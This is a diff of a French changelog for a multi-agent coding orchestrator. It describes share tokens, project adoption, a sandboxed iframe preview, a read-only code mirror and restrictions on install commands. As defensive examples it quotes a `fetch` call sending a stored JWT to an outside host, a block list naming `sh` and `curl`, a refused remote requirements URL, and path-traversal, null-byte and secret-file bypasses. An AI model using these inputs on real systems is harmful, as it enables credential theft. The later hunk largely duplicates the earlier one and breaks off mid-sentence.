@@ -9,6 +9,377 @@ et ce projet adhère au [Semantic Versioning](https://semver.org/spec/v2.0.0.htm
 
 ### Added
 
+- **🔑 Les clés de la ruche ont un écran** (panneau dans l'Intendance, routes
+  `GET /api/membres`, `DELETE /api/membres/:nodeId`, `DELETE /api/billets/:id`).
+  Révoquer une clé compromise est l'archétype de la décision d'administration,
+  et elle n'existait qu'en ligne de commande : le tableau de bord montrait le
+  pouls, les anomalies, les castes et les comptes — mais pas « qui a une clé de
+  ma ruche ». **Les deux gestes sont séparés et leurs conséquences écrites**,
+  parce qu'ils n'ont rien d'interchangeable : une CLÉ appartient à une machine
+  et la révoquer la déconnecte tout de suite ; un BILLET ne vaut rien par
+  lui-même — il sert à obtenir une clé, à usage compté — et le révoquer ne
+  déconnecte personne. Confondre les deux, c'est croire avoir exclu quelqu'un en
+  révoquant le billet par lequel il est entré ; un test fait les deux gestes à
+  la suite sur la même ruche pour que cette confusion soit rouge. Les empreintes
+  ne sortent jamais de la liste.
+
+- **🗣 Le Conseil des Éclaireuses a un écran** (panneau dans la carte projet,
+  routes `GET /api/conseils` et `GET /api/conseil/:sessionId`). Le Conseil ne
+  change RIEN : sa sortie **EST une proposition à un humain**, exactement comme
+  la Miellerie propose un merge sans jamais le faire. Il a pourtant vécu sans
+  aucune interface — l'humain devait ouvrir un terminal pour lire ce qu'on avait
+  délibéré pour lui. C'est le cas le plus net de « mécanisme sans écran » du
+  dépôt, plus net que Les Guetteuses, dont la sortie était au moins une alerte.
+  **On montre les propositions ÉCARTÉES, pas seulement la retenue** : trois des
+  quatre pièges que le protocole évite ne se voient que là. Le **signal d'arrêt**
+  motivé — une piste qu'une éclaireuse est allée vérifier et a jugée mauvaise —
+  est l'information la plus chère du conseil, et elle ne vit que dans une
+  perdante. La **diversité des familles** est affichée à côté du nombre de
+  soutiens, parce que dix instances du même modèle qui s'accordent ne font pas
+  dix avis. Et une issue sans recommandation (`vide`, `sans_quorum`, `epuise`,
+  `depart`) se **dit** : « personne n'a rien trouvé » est un résultat, un écran
+  vide ressemblerait à une panne. Enfin, la liste rend l'issue RANGÉE (nulle tant
+  qu'on délibère) alors que le détail RECALCULE ce que le protocole dirait
+  maintenant : le détail annonce donc son verdict **provisoire** tant que le
+  conseil est ouvert, sinon le résumé aurait l'air de contredire son propre
+  détail.
+
+- **🐙 Le connecteur GitHub a un écran** (panneau « Connecter un dépôt GitHub »
+  en tête de la vue Projets). `GET /api/github/repos` et
+  `POST /api/github/import` vivaient depuis le début sans aucune interface :
+  connecter un dépôt se faisait en ligne de commande, alors que c'est le tout
+  PREMIER geste de quelqu'un qui arrive avec du code existant. Le panneau liste
+  les dépôts (plus récents d'abord), marque privé / archivé / langage, signale
+  ceux **déjà connectés** — deux projets sur un même dépôt, c'est deux plans de
+  merge concurrents sur les mêmes fichiers — et connecte en un clic.
+  **L'écran ne demande jamais le jeton GitHub** : il vit dans l'environnement de
+  l'orchestrateur, en mémoire, le temps du processus. Un champ « collez votre
+  jeton » en ferait une valeur qui traverse le navigateur, l'historique et le
+  presse-papiers, pour un gain nul — c'est l'orchestrateur qui appelle GitHub,
+  pas le navigateur. Quand le jeton manque, le 501 du serveur porte déjà la
+  marche à suivre : on l'affiche telle quelle plutôt que d'en inventer une qui
+  dériverait. **Et le dépôt connecté appartient désormais à qui l'a connecté** :
+  l'import s'authentifiant par le jeton de ruche, il rangeait le projet
+  orphelin, donc inutilisable par son importateur jusqu'à ce qu'un
+  administrateur l'adopte. La voie CLI reste orpheline — elle n'a que le jeton
+  de ruche — et c'est le cas que l'adoption rattrape.
+
+### Tests
+
+- **La boucle complète d'une caste, du travail réel au cadre injecté**
+  (`tests/caste-boucle.test.ts`). Le module pur était éprouvé (à antécédents
+  donnés, quelle caste) et le câblage aussi (à caste donnée, quel cadre) — mais
+  les deux **semaient les inspections à la main**. Le maillon qu'aucun ne
+  parcourait était celui du milieu : un nœud rend une production → les
+  Gardiennes l'inspectent à la RÉCEPTION → l'inspection se range → le corpus
+  borné la relit → la caste change → la tâche SUIVANTE reçoit un autre cadre.
+  Cinq maillons, chacun testé, et rien ne vérifiait qu'ils étaient attachés. Le
+  test fait le trajet sur un vrai nœud WebSocket, sans rien semer. Il verrouille
+  surtout **« pas de cliquet »** — une caste se perd exactement comme elle se
+  gagne (doctrine, règle 3) — sur le CORPUS RÉEL, borné et relu à l'envers, là
+  où un cliquet se cacherait sans qu'on le voie ; la règle n'était vérifiée que
+  sur des antécédents fabriqués. Au passage, le test a d'abord accusé les
+  Gardiennes de ne pas mordre sur un diff vide : c'était **le test qui avait
+  tort**, les Gardiennes ne crient au diff vide que si un diff POUVAIT exister
+  (dépôt connecté, promesse nommée, zéro octet rendu) — c'est écrit dans le
+  fichier pour que la prochaine lecture ne refasse pas l'erreur.
+
+### Fixed
+
+- **La préparation laissait déplacer la source par la forme COURTE d'un drapeau,
+  et par la valeur d'un autre.** Deux trous dans une règle que le module énonce
+  pourtant clairement (« refusés même quand la sous-commande est bonne »).
+  D'abord `--find-links` était banni pendant que **`-f`, le même drapeau**,
+  figurait parmi les drapeaux à valeur et passait tranquillement : interdire un
+  nom en laissant son synonyme ouvert ne ferme rien. Ensuite
+  `pip install -r http://ailleurs/requirements.txt` était accepté — la LETTRE de
+  la règle est respectée (c'est un fichier qui nomme les paquets, pas la
+  commande) et son esprit trahi exactement comme avec `--index-url` : c'est un
+  tiers qui décide de ce qui s'installe. La même porte, ailleurs. Les formes
+  courtes `-i` et `-f` rejoignent les drapeaux de source, et la valeur d'un
+  `-r`/`--requirement`/`-c` doit désigner un fichier DU DÉPÔT — un chemin local,
+  y compris en sous-dossier, passe toujours.
+
+### Tests
+
+- **La propriété qui rend les exemples de `zoneModifiee` justes**
+  (`tests/retouche.test.ts`). Les dix-huit tests de ce module testaient par
+  l'EXEMPLE — telle entrée, tel triplet — et **un bug réel les traversait tous** :
+  en retirant la borne qui empêche le préfixe et le suffixe communs de se
+  chevaucher, tout restait vert alors que `zoneModifiee(['a'], ['a','a'])`
+  rendait `null`, c'est-à-dire « rien n'a bougé » sur une insertion réelle (la
+  retouche aurait été refusée pour « aucun changement » à quelqu'un qui venait
+  d'écrire une ligne). La propriété ajoutée dit ce que la fonction PROMET — ce
+  qu'on rogne aux deux bouts est réellement commun, donc les DEUX fichiers se
+  reconstruisent depuis la zone — et se vérifie sur les 961 paires de suites de
+  longueur ≤ 4 : exhaustif sur les petits cas, donc reproductible, plutôt
+  qu'aléatoire.
+
+- **La ruche fusionnait n'importe quelle pull request du dépôt.**
+  `POST /api/livraison/fusion` disait, dans son propre commentaire, « fusionne
+  une pull request ouverte par la ruche » — et acceptait n'importe quel numéro.
+  Elle fusionnait donc, **avec le jeton GitHub de l'hôte**, la PR qu'un humain
+  était en train de relire, ou celle d'un contributeur extérieur. Le geste est
+  réputé humain, mais le jeton qui l'autorise se recopie sur chaque machine
+  membre (ADR 0007). Le défaut n'était visible dans aucune des deux routes : il
+  tenait à une **troisième chose, que ni l'une ni l'autre ne faisait**. La voie
+  autonome range ses livraisons dans la table `livraisons` ; la voie MANUELLE se
+  contentait d'émettre un événement, si bien que le numéro de PR n'existait
+  nulle part où le retrouver — ni pour rouvrir « où en est ma livraison ? », ni
+  pour vérifier quoi que ce soit à son sujet. Les deux moitiés sont réparées :
+  la livraison manuelle range comme l'autonome, la fusion **ne fusionne que ce
+  que la ruche a ouvert**, et l'état suit la fusion (une livraison fusionnée qui
+  resterait « ouverte » ferait mentir l'écran et rouvrirait la porte à une
+  seconde fusion). Le refus nomme l'alternative : les autres pull requests se
+  fusionnent sur GitHub — c'est votre dépôt, pas le sien.
+
+- **Un compte recevait 401 sur le rapport de son PROPRE projet.** Onze routes de
+  l'espace projet se gardent par le seul jeton de ruche, sans aucune règle par
+  projet, là où Le Rayon, les membres et les partages se gardent par COMPTE. Le
+  tableau de bord ne s'en apercevait pas — il envoie les deux en-têtes — mais
+  toute autre intégration s'y cognait. Six lectures (`merge`, `merge/result`,
+  `conflicts`, `balance`, `essaim`, `abonnement`) acceptent désormais AUSSI un
+  compte ayant affaire au projet. **C'est une ouverture stricte** : aucune porte
+  existante n'est retirée, la CLI et le mode « tableau de bord sans compte »
+  continuent de marcher à l'identique. ⚠ **Cela ne résout pas le fond**, et
+  `docs/adr/0007-portee-du-jeton-de-ruche.md` l'écrit : le README annonce que
+  `HIVE_TOKEN` se recopie sur chaque machine membre, donc toute abeille de
+  l'essaim lit encore le plan de merge et la balance de n'importe quel projet —
+  et peut **déclencher un merge**, ce qui fait exécuter la commande de test du
+  dépôt sur la machine d'un autre membre. Resserrer change le contrat du produit
+  (la CLI n'a que le jeton de ruche) : c'est une décision d'hôte, posée dans
+  l'ADR avec ses trois voies et leurs coûts. Un test **constate** l'état actuel
+  et **échouera** le jour où quelqu'un tranchera — pour que ce soit un geste
+  conscient et non une découverte.
+
+- **Un projet créé depuis le tableau de bord n'appartenait à personne** — sur le
+  parcours le PLUS courant du produit. `POST /api/projects` s'authentifie par le
+  jeton de RUCHE : il n'a personne à qui attribuer le projet, et le magasin range
+  par défaut `visibility: 'private'`, `ownerId: null`. Une fois le contrôle
+  d'accès posé, la conséquence devient absurde — la personne qui vient de créer
+  son projet ne peut ni en lire le code, ni y admettre quelqu'un, ni le partager,
+  sauf à être administratrice. `POST /api/projects/user` existait depuis le début
+  pour ça : il attribue le projet au compte appelant et l'inscrit comme membre
+  `owner`. **Personne ne l'appelait.** Le défaut n'était donc dans aucune route,
+  il était dans ce qu'aucune ne faisait — exactement le motif de l'adoption. La
+  porte « jeton de ruche » reste ouverte (le tableau de bord s'utilise sans
+  compte) et produit toujours un orphelin, ce qui est précisément le cas que
+  l'adoption rattrape. Vérifié au navigateur avec un compte SIMPLE MEMBRE, pas
+  administrateur — sinon `voir_tous_les_projets` masquerait le défaut : elle crée
+  son projet, lit son code (200), le partage (200), et l'écran d'équipe la montre
+  « owner ».
+
+- **Le jeton du dépôt s'affichait encore sur la carte projet** (troisième
+  endroit, troisième découverte séparée). Un `repoUrl` porte un secret
+  POTENTIEL : la façon de donner ses identifiants à `git clone` sans
+  configuration, c'est de les écrire dedans (`https://user:ghp_…@github.com/…`),
+  et le champ « dépôt » du formulaire de création l'accepte tel quel. La fuite a
+  été fermée sur le catalogue public, puis dans la vue Rayon — et la carte
+  projet l'affichait toujours brut, en texte **et** en attribut `title`, juste à
+  côté de la vue qui, elle, le lavait. Cette carte est vue par toute abeille qui
+  rejoint la ruche : c'est même le but du tableau de bord. Le correctif a donc
+  été écrit deux fois avant d'être complet, et ce n'est pas un défaut
+  d'attention — c'est qu'aucun test ne portait sur la RÈGLE, seulement sur
+  chacun de ses endroits. Deux gardes nouvelles la portent désormais :
+  `tests/repourl-affichage.test.ts` refuse qu'une vue lise `x.repoUrl` sans
+  passer par `sansIdentifiants`, et `tests/parcours-jeton-depot.test.ts` suit un
+  projet dont l'URL porte un secret sur TOUT son trajet — adopté, ouvrière
+  admise, partagé, lu — et vérifie que le secret n'apparaît dans aucune réponse,
+  refus du miroir compris (« git a échoué sur <URL> » est l'explication la plus
+  naturelle à écrire, et la pire). Ce dernier porte son propre méta-test : une
+  réponse vide ou refusée ne prouve rien, et un test qui n'a rien regardé est le
+  pire des verts.
+
+### Added
+
+- **🔗 Le partage en lecture A ENFIN UN ÉCRAN — aux deux bouts** (vue
+  `dashboard/src/views/Partage.tsx`, panneau de création dans la vue Projets,
+  aiguillage dans `main.tsx`). Le mécanisme était entier côté serveur — jeton
+  distinct, deux actes, expiration, révocation individuelle, tests — et n'avait
+  **aucune interface** : ni pour créer un lien, ni pour en lire un. Une personne
+  à qui on envoyait l'URL arrivait sur la mire de connexion d'une ruche où elle
+  n'a pas de compte. C'était documenté comme si ça marchait, ce qui est pire que
+  de ne pas l'avoir. **L'acte `voir_avancement` était lui aussi déclaré et
+  inutilisable** : les trois seules routes qui acceptaient un lien demandaient
+  toutes `lire_code`, si bien qu'un lien « voir l'avancement » ne montrait jamais
+  d'avancement. `GET /report` l'accepte désormais — et **rend `contributingNodes`
+  vide** pour un lien : les identifiants de nœuds nomment les machines de gens
+  qui n'ont pas consenti à figurer dans un lien qu'on fait circuler.
+  L'aiguillage est **avant `App`**, pas dedans : `App` ouvre le flux WebSocket
+  avec le jeton de ruche dès son montage et sonde le pouls, ce qu'un porteur de
+  lien ne peut pas faire — et les hooks partent avant qu'une branche interne ait
+  fini de choisir. Le jeton vit dans `sessionStorage` (il meurt avec l'onglet,
+  exactement la durée d'un lien qu'on vous a montré, et il ne contamine pas
+  l'onglet où vous êtes connecté à votre compte) et il est **retiré de la barre
+  d'adresse** après lecture : il voyage après le `#`, donc aucun journal
+  d'accès ne le voit, et une capture d'écran ne doit pas suffire à refaire le
+  lien. Côté client, **un seul helper** (`apiLecture`) porte les lectures
+  partageables, en miroir de `projetLisible()` côté serveur : deux familles de
+  fonctions donneraient deux listes à tenir d'accord, et c'est toujours celle
+  qu'on oublie qui décide. La retouche, elle, reste sur `apiCompte` — un porteur
+  de lien lit, il ne fabrique pas de travail pour l'essaim d'autrui — et le
+  bouton ne lui est même pas proposé. Éprouvé de bout en bout dans un navigateur
+  **sans compte ni jeton de ruche** : avancement visible, code lisible, `.env`
+  absent, aucun nœud nommé, aucune retouche possible (401), puis lien révoqué →
+  refus indistinguable de l'inexistence.
+
+- **👥 Adopter un projet, y admettre des ouvrières** (règles pures
+  `peutAdopter` / `peutAdmettre` dans `src/shared/acces-projet.ts`, routes
+  `POST /api/projects/:id/adopter` et `…/membres` en POST et DELETE, panneau
+  « Équipe » dans la vue Projets). Un
+  projet privé n'avait **aucun moyen de gagner un membre** : `POST /join`
+  n'admet, sur un projet privé, que le propriétaire, l'administrateur et ceux
+  qui sont déjà membres — ce qui est correct (on ne s'invite pas chez les
+  autres) et incomplet, puisqu'il n'existait aucune route pour INVITER. Un
+  dépôt importé de GitHub cumulait les deux : privé **et** sans propriétaire,
+  l'import s'authentifiant par le jeton de ruche, qui n'est le compte de
+  personne. On connectait son dépôt, et aucune de ses abeilles ne le voyait —
+  l'exact contraire de ce pour quoi Le Rayon a été construit. Chaque route se
+  comportait pourtant comme son test le demandait : le défaut n'était dans
+  aucune, il était dans ce qu'**aucune ne faisait**. Deux règles tiennent le
+  reste : **adopter n'est jamais prendre** (un projet qui a déjà un
+  propriétaire ne change pas de mains, même pour un administrateur — il peut
+  déjà tout LIRE, s'approprier est un autre acte ; la condition « pas encore de
+  propriétaire » vit DANS l'instruction d'écriture, donc deux adoptions ne
+  peuvent pas réussir toutes les deux) et **admettre est le droit du
+  propriétaire, pas d'un membre** (sinon le premier invité invite à son tour,
+  et « privé » ne veut plus rien dire au bout de trois personnes). L'admission
+  se fait par **identifiant de compte, jamais par courriel** : le courriel
+  ferait de cette route un oracle « ce courriel a-t-il un compte ici ? »
+  interrogeable par tout propriétaire de projet, alors que l'inscription a été
+  durcie exprès pour ne pas répondre à cette question. L'écran montre donc à
+  chacun son propre identifiant, à donner comme on se passe un billet. Le
+  refus garde la forme exacte de l'inexistence, vérifiée à l'octet près.
+
+- **🐝 Le polyéthisme a un écran** (carte dans la vue Essaim).
+  `/api/polyethisme` calculait des castes que personne ne voyait, ce qui
+  revient à ne pas les calculer. Le Waggle Board classe par volume, les
+  phéromones par affinité ; ni l'un ni l'autre ne répond à « à qui puis-je
+  confier quoi ». La carte affiche les **deux modes** — celui qu'on a réglé et
+  celui qui s'applique — parce que sans Gardiennes le polyéthisme s'éteint de
+  lui-même, et que cet écart est le fait le plus utile de l'écran. Chaque ligne
+  dit ce qui **manque** pour monter d'un palier : « nourrice » n'est pas un
+  reproche, c'est l'état d'un nœud **non observé**, donc de tout nouvel
+  arrivant.
+
+- **📦 L'environnement — l'agent installe ce dont il a besoin** (module pur
+  `src/shared/preparation.ts`, champ `prepareCommand` sur
+  `POST /api/projects/:id/merge/run`). `npm test` sur un clone frais échoue
+  faute de `node_modules` : le verdict qui remontait disait « tests en échec »
+  là où il fallait lire « environnement absent », et l'hôte partait chercher une
+  régression dans du code qui allait très bien. **La préparation installe ce que
+  le DÉPÔT déclare, jamais ce que la COMMANDE nomme** — `npm ci` lit le
+  `package-lock.json` du dépôt, `npm install lodash` laisse le hub décider de ce
+  qui s'exécute sur la machine d'un membre. La frontière de confiance de la
+  ruche est le dépôt que l'hôte a choisi de connecter, et elle le reste. Trois
+  refus, chacun fermant un chemin distinct : **binaire** hors liste (`sh`,
+  `curl`, `make`), **sous-commande** hors liste (`npm run deploy` est du code
+  arbitraire déguisé en installation), et **argument positionnel** — c'est lui
+  qui nomme un paquet. S'y ajoutent les drapeaux qui déplacent la **source**
+  (`--index-url`, `--registry`, `--userconfig`…) : respecter la lettre de la
+  règle en laissant un tiers fournir les paquets en trahirait l'esprit. Ce que
+  ça ne protège pas, et il faut le dire : `npm ci` exécute les `postinstall` du
+  dépôt, donc qui contrôle le dépôt exécute du code sur la machine du membre,
+  exactement comme avec `npm test`. **L'ordre est la partie qui ne se voit
+  pas** : la préparation tourne avant les tests (sinon elle ne sert à rien), le
+  diff cumulé est calculé avant elle (sinon `node_modules` finit sous les yeux
+  de l'humain qui relit), et une **préparation en échec n'est pas un test
+  rouge** — les tests ne sont pas lancés, `preparedOk` le dit séparément de
+  `testsPassed`, et l'écran comme la CLI affichent « environnement non préparé »
+  au lieu d'un verdict trompeur. Garde posée **aux trois bouts** (hub en 400
+  avant le choix du nœud, nœud avant de cloner, `runMerge` avant la moindre
+  écriture) et enveloppée par le bac à sable, comme le reste. Éprouvé hors ligne
+  sur un vrai `npm ci` : dépôt à lockfile vide, script `prepare` déposant un
+  témoin que la commande de test cherche — c'est ainsi qu'on observe l'ordre au
+  lieu de le supposer.
+
+- **✏️ L'éditeur de la Reine — une retouche devient une TÂCHE** (module pur
+  `src/shared/retouche.ts`, route `POST /api/projects/:id/rayon/retouche`).
+  Le miroir du Rayon est une **copie jetable** : y écrire donnerait l'illusion
+  d'avoir corrigé quelque chose, jusqu'au prochain rafraîchissement qui
+  effacerait tout en silence. Une modification à l'écran fabrique donc une tâche
+  — titre, prompt, contenu du fichier enveloppé dans le bloc de données non
+  fiables — qui passe par la revue comme n'importe quelle production. Le bouton
+  dit « **Proposer** », jamais « Enregistrer » : le mot promet ce que le système
+  fait. Réservé au propriétaire du projet (et aux administrateurs) ; **un
+  porteur de lien de partage lit, il ne fabrique pas de travail** pour l'essaim
+  de quelqu'un d'autre — sans cette distinction, un lien envoyé « juste pour
+  montrer » deviendrait un droit de faire tourner des agents sur les machines
+  des membres.
+
+- **👁 L'Aperçu — voir ce que l'IA construit, sans lui donner la session**
+  (module pur `src/shared/apercu.ts`, route
+  `GET /api/projects/:id/apercu`). Prévisualiser un site que l'agent vient
+  d'écrire, c'est **exécuter dans le navigateur de l'hôte** du HTML et du
+  JavaScript que personne n'a relus. Servi en même origine que le tableau de
+  bord, `fetch('https://ailleurs/', {body: localStorage['hive.jwt']})` suffirait
+  à donner la ruche. Quatre murs, et le premier est celui qui compte : **origine
+  opaque** (`<iframe sandbox="allow-scripts">` **sans `allow-same-origin`** — le
+  cadre ne lit ni le `localStorage` ni les cookies) ; **aucun identifiant ne
+  circule** (le document est assemblé côté hôte et injecté par `srcdoc`, le
+  cadre n'appelle jamais la ruche) ; **réseau coupé** par une
+  `Content-Security-Policy` en tête de document (`default-src 'none'`,
+  `connect-src 'none'`, `form-action 'none'`) ; **aucune navigation** (ni
+  `allow-top-navigation`, ni `allow-popups`, ni `allow-forms` — un aperçu qui
+  peut remplacer la page par une fausse mire de connexion est un hameçonnage
+  servi depuis le domaine de confiance de l'utilisateur). Le site est replié en
+  **un document auto-suffisant** — feuilles et scripts recopiés à l'intérieur,
+  puisqu'une origine opaque sans réseau ne peut rien charger — avec les
+  fermetures de balise échappées (`</script>` dans un fichier JS est
+  l'échappatoire classique de l'inlining) et la règle de chemins du Rayon
+  réutilisée, pour que `../../.env` ne devienne pas une feuille de style parce
+  qu'il est écrit dans un `href`. Éprouvé sur un site **hostile** tentant
+  exactement ce qu'un attaquant tenterait : `localStorage=BLOQUÉ`,
+  `origine=null`, `parent=BLOQUÉ`, `Failed to fetch` — pendant que la page
+  s'affichait normalement, CSS repliée comprise.
+
+- **🔗 Le partage en lecture — montrer un projet sans donner la ruche** (module
+  pur `src/shared/partage.ts`, table latérale `partages`, routes
+  `POST/GET/DELETE /api/projects/:id/partages`). Le jeton de partage n'est
+  **pas** le jeton de ruche : préfixe `hive3_` distinct, **deux actes
+  seulement** (voir l'avancement, lire le code), valable pour **un** projet,
+  expirable (7 jours par défaut, 90 au plus) et **révocable un par un** sans
+  toucher aux autres — là où révoquer `HIVE_TOKEN` déconnecte tout l'essaim. Le
+  jugement énonce ses refus dans l'ordre qui renseigne le moins un curieux
+  (révoqué avant expiré avant mauvais projet), et le décodage exige la **forme
+  canonique** : base64url étant tolérant, `hive3_XXXX` et `hive3_XXXXy`
+  décodaient à l'identique — un identifiant qui s'écrit d'une infinité de façons
+  casse tout ce qui compte des chaînes de caractères.
+
+- **🍯 Le Rayon — les abeilles voient enfin le code** (module pur
+  `src/shared/rayon.ts`, miroir `src/orchestrator/miroir.ts`, routes
+  `GET /api/projects/:id/rayon` et `.../rayon/fichier`). Ce que les membres
+  voyaient jusqu'ici, c'étaient des **tâches** : des titres, des états, des
+  diffs. Jamais le code. On travaillait sur un projet sans pouvoir l'ouvrir —
+  comme aider à réparer un moteur sans avoir le droit de soulever le capot.
+  **Le hub tient désormais son propre miroir**, un clone superficiel en lecture
+  seule par projet (`data/rayons/<id>`), rafraîchi au plus une fois par minute
+  et déduplique les rafraîchissements concurrents — deux `git` dans le même
+  répertoire ne donnent pas deux dépôts à jour, ils donnent un dépôt corrompu.
+  Le choix du miroir plutôt que de l'API GitHub est délibéré : l'API exigerait
+  le **jeton de l'hôte** (montrer le code à une abeille dépenserait pour elle
+  un droit qui n'est pas le sien), ne marcherait que sur GitHub, et son quota
+  s'épuiserait à trois personnes parcourant un arbre de fichiers. **Deux gardes
+  indépendantes, et les deux doivent passer** : `peutLireCode` (public = tout
+  compte, privé = membres et propriétaire, refus **indistinguable de
+  l'inexistence**) et la liste de ce qui ne se sert jamais — **`.git` en
+  premier**, puisqu'il contient `config`, donc l'URL distante, donc les
+  identifiants du dépôt privé ; puis les `.env`, `.npmrc`, `id_rsa` et les
+  extensions de clés. Sans la seconde, un membre parfaitement légitime repartait
+  avec le jeton GitHub de l'hôte. Sept contournements sont fermés **nommément,
+  chacun avec son test** : `..` mêlé à des segments valides, séparateurs
+  Windows, chemins absolus (POSIX, lettre de lecteur, UNC), **octet nul**
+  (`fichier.txt\0.png` — les couches C tronquent là où JavaScript ne le fait
+  pas, donc ce qui est ouvert n'est pas ce qui a été vérifié), **liens
+  symboliques** (éprouvés sur de vrais liens vers `/etc` dans un vrai dépôt —
+  aucune règle pure ne peut les voir, seul le disque sait où ils mènent), et
+  **le bug de préfixe** : `'/srv/rayon-mechant'.startsWith('/srv/rayon')` est
+  vrai, et c'est l'erreur qu'on introduit précisément en croyant refermer la
+  faille. Binaires refusés plutôt que déversés dans un éditeur, fichiers bornés
+  à 512 Ko, tri « dossiers d'abord » avec `localeCompare` français — trier à
+  l'octet mettrait `Élan` en toute fin d'une liste qu'on ne pourrait plus
+  parcourir.
+
 - **🛂 Les Gardiennes — le contrôle d'entrée du nectar** (module pur
   `src/orchestrator/gardiennes.ts`). Jusqu'ici la ruche croyait l'agent sur
   parole : un `success: true` accompagné d'un **diff vide** fabriquait un
@@ -478,7 +849,150 @@ et ce projet adhère au [Semantic Versioning](https://semver.org/spec/v2.0.0.htm
   contrefaçon (ancien secret public, compte inexistant, secret d'une autre
   ruche) avec le jeton légitime en contrôle négatif.
 
+### Added
+
+- **🔑 Les clés de la ruche ont un écran** (panneau dans l'Intendance, routes
+  `GET /api/membres`, `DELETE /api/membres/:nodeId`, `DELETE /api/billets/:id`).
+  Révoquer une clé compromise est l'archétype de la décision d'administration,
+  et elle n'existait qu'en ligne de commande : le tableau de bord montrait le
+  pouls, les anomalies, les castes et les comptes — mais pas « qui a une clé de
+  ma ruche ». **Les deux gestes sont séparés et leurs conséquences écrites**,
+  parce qu'ils n'ont rien d'interchangeable : une CLÉ appartient à une machine
+  et la révoquer la déconnecte tout de suite ; un BILLET ne vaut rien par
+  lui-même — il sert à obtenir une clé, à usage compté — et le révoquer ne
+  déconnecte personne. Confondre les deux, c'est croire avoir exclu quelqu'un en
+  révoquant le billet par lequel il est entré ; un test fait les deux gestes à
+  la suite sur la même ruche pour que cette confusion soit rouge. Les empreintes
+  ne sortent jamais de la liste.
+
+- **🗣 Le Conseil des Éclaireuses a un écran** (panneau dans la carte projet,
+  routes `GET /api/conseils` et `GET /api/conseil/:sessionId`). Le Conseil ne
+  change RIEN : sa sortie **EST une proposition à un humain**, exactement comme
+  la Miellerie propose un merge sans jamais le faire. Il a pourtant vécu sans
+  aucune interface — l'humain devait ouvrir un terminal pour lire ce qu'on avait
+  délibéré pour lui. C'est le cas le plus net de « mécanisme sans écran » du
+  dépôt, plus net que Les Guetteuses, dont la sortie était au moins une alerte.
+  **On montre les propositions ÉCARTÉES, pas seulement la retenue** : trois des
+  quatre pièges que le protocole évite ne se voient que là. Le **signal d'arrêt**
+  motivé — une piste qu'une éclaireuse est allée vérifier et a jugée mauvaise —
+  est l'information la plus chère du conseil, et elle ne vit que dans une
+  perdante. La **diversité des familles** est affichée à côté du nombre de
+  soutiens, parce que dix instances du même modèle qui s'accordent ne font pas
+  dix avis. Et une issue sans recommandation (`vide`, `sans_quorum`, `epuise`,
+  `depart`) se **dit** : « personne n'a rien trouvé » est un résultat, un écran
+  vide ressemblerait à une panne. Enfin, la liste rend l'issue RANGÉE (nulle tant
+  qu'on délibère) alors que le détail RECALCULE ce que le protocole dirait
+  maintenant : le détail annonce donc son verdict **provisoire** tant que le
+  conseil est ouvert, sinon le résumé aurait l'air de contredire son propre
+  détail.
+
+- **🐙 Le connecteur GitHub a un écran** (panneau « Connecter un dépôt GitHub »
+  en tête de la vue Projets). `GET /api/github/repos` et
+  `POST /api/github/import` vivaient depuis le début sans aucune interface :
+  connecter un dépôt se faisait en ligne de commande, alors que c'est le tout
+  PREMIER geste de quelqu'un qui arrive avec du code existant. Le panneau liste
+  les dépôts (plus récents d'abord), marque privé / archivé / langage, signale
+  ceux **déjà connectés** — deux projets sur un même dépôt, c'est deux plans de
+  merge concurrents sur les mêmes fichiers — et connecte en un clic.
+  **L'écran ne demande jamais le jeton GitHub** : il vit dans l'environnement de
+  l'orchestrateur, en mémoire, le temps du processus. Un champ « collez votre
+  jeton » en ferait une valeur qui traverse le navigateur, l'historique et le
+  presse-papiers, pour un gain nul — c'est l'orchestrateur qui appelle GitHub,
+  pas le navigateur. Quand le jeton manque, le 501 du serveur porte déjà la
+  marche à suivre : on l'affiche telle quelle plutôt que d'en inventer une qui
+  dériverait. **Et le dépôt connecté appartient désormais à qui l'a connecté** :
+  l'import s'authentifiant par le jeton de ruche, il rangeait le projet
+  orphelin, donc inutilisable par son importateur jusqu'à ce qu'un
+  administrateur l'adopte. La voie CLI reste orpheline — elle n'a que le jeton
+  de ruche — et c'est le cas que l'adoption rattrape.
+
+### Tests
+
+- **La boucle complète d'une caste, du travail réel au cadre injecté**
+  (`tests/caste-boucle.test.ts`). Le module pur était éprouvé (à antécédents
+  donnés, quelle caste) et le câblage aussi (à caste donnée, quel cadre) — mais
+  les deux **semaient les inspections à la main**. Le maillon qu'aucun ne
+  parcourait était celui du milieu : un nœud rend une production → les
+  Gardiennes l'inspectent à la RÉCEPTION → l'inspection se range → le corpus
+  borné la relit → la caste change → la tâche SUIVANTE reçoit un autre cadre.
+  Cinq maillons, chacun testé, et rien ne vérifiait qu'ils étaient attachés. Le
+  test fait le trajet sur un vrai nœud WebSocket, sans rien semer. Il verrouille
+  surtout **« pas de cliquet »** — une caste se perd exactement comme elle se
+  gagne (doctrine, règle 3) — sur le CORPUS RÉEL, borné et relu à l'envers, là
+  où un cliquet se cacherait sans qu'on le voie ; la règle n'était vérifiée que
+  sur des antécédents fabriqués. Au passage, le test a d'abord accusé les
+  Gardiennes de ne pas mordre sur un diff vide : c'était **le test qui avait
+  tort**, les Gardiennes ne crient au diff vide que si un diff POUVAIT exister
+  (dépôt connecté, promesse nommée, zéro octet rendu) — c'est écrit dans le
+  fichier pour que la prochaine lecture ne refasse pas l'erreur.
+
 ### Fixed
+
+- **La préparation laissait déplacer la source par la forme COURTE d'un drapeau,
+  et par la valeur d'un autre.** Deux trous dans une règle que le module énonce
+  pourtant clairement (« refusés même quand la sous-commande est bonne »).
+  D'abord `--find-links` était banni pendant que **`-f`, le même drapeau**,
+  figurait parmi les drapeaux à valeur et passait tranquillement : interdire un
+  nom en laissant son synonyme ouvert ne ferme rien. Ensuite
+  `pip install -r http://ailleurs/requirements.txt` était accepté — la LETTRE de
+  la règle est respectée (c'est un fichier qui nomme les paquets, pas la
+  commande) et son esprit trahi exactement comme avec `--index-url` : c'est un
+  tiers qui décide de ce qui s'installe. La même porte, ailleurs. Les formes
+  courtes `-i` et `-f` rejoignent les drapeaux de source, et la valeur d'un
+  `-r`/`--requirement`/`-c` doit désigner un fichier DU DÉPÔT — un chemin local,
+  y compris en sous-dossier, passe toujours.
+
+### Tests
+
+- **La propriété qui rend les exemples de `zoneModifiee` justes**
+  (`tests/retouche.test.ts`). Les dix-huit tests de ce module testaient par
+  l'EXEMPLE — telle entrée, tel triplet — et **un bug réel les traversait tous** :
+  en retirant la borne qui empêche le préfixe et le suffixe communs de se
+  chevaucher, tout restait vert alors que `zoneModifiee(['a'], ['a','a'])`
